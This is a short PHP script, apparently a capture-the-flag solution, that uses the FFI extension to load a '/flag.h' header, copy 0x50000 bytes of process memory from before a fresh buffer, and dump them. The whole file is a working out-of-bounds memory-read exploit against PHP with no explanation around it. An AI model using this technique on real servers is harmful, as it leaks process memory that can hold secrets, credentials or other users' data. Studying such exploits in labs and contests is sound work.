<?php
try {
    $ffi=FFI::load("/flag.h");
    $leak = FFI::new("char[0x50000]", false);
    FFI::memcpy($leak, $leak-0x50000, 0x50000);
    $tmp = FFI::string($leak,0x50000);
    var_dump($tmp);
} catch (FFI\Exception $ex) {
    echo $ex->getMessage(), PHP_EOL;
}

?>